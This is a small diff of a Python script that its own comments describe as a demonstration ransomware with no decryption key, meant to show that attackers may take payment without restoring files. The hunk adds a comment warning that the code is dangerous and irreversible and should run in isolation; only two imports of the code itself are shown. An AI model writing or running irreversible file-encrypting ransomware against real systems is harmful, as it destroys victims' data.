@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 #This is a ransomware without the password/decryption_code and it is to demonstrate some hackers can collect payment without any intention of releasing the locked file.
+#This Ramsomware is a very dangerous code and it cannot be reversed. Make you you run this in an isolated directory and environment to avoid system issues.
 import os
 from cryptography.fernet import Fernet
 
